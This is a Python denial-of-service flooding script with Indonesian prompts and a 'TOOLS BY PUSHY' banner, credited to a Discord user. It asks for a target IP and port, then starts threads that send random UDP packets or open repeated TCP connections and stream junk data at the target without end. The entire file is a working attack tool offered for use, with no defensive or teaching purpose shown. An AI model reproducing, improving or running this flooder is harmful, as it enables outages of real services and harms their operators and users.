#!/usr/bin/env python3
import random
import socket
import threading
import os
import sys

os.system("clear")
print("""\033[91m
                  TOOLS BY PUSHY
██╗░░░██╗███████╗████████╗████████╗████████╗
██║░░░██║██╔════╝╚══██╔══╝╚══██╔══╝╚══██╔══╝
██║░░░██║█████╗░░░░░██║░░░░░░██║░░░░░░██║░░░
██║░░░██║██╔══╝░░░░░██║░░░░░░██║░░░░░░██║░░░
╚██████╔╝██║░░░░░░░░██║░░░░░░██║░░░░░░██║░░░
░╚═════╝░╚═╝░░░░░░░░╚═╝░░░░░░╚═╝░░░░░░╚═╝░░░ """)

print(" TOOLS BY : PUSHY")
print(" ###########################################")
print(" | AUTOR   : pushy                           ")
print(" • CODE    : pushy X raintopia                 •")
print(" • DISCORD : PushyGamerTag27#7165                   •")
print(" | MY TEAM : https://discord.gg/TQnzn6kMRp.  |")
print(" ###########################################")
             
ip = str(input("  IP TARGET:"))
port = int(input(" PORT TARGET:"))
choice = str(input(" LANJUT UNTUK MENDDOS? (y/n):"))
times = int(input(" BERAPA PAKET DIKIRIM:"))
threads = int(input(" ISI SETIAP PAKET:"))
def run():
	data = random._urandom(1025)
	i = random.choice(("[TOK!!!TOK!!!]","[TOK!!!TOK!!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" PERMISI PAKET FROM pushy !!! ")
		except:
			print("[!] PAKETNYA ENAK GAK OM !!!")

def run2():
	data = random._urandom(150)
	i = random.choice(("[TOK!!!TOK!!!]","[TOK!!!TOK!!!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" PERMISI PAKET FROM pushy !!! ")
		except:
			s.close()
			print("[*] PAKETNYA ENAK GAK OM !!!")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
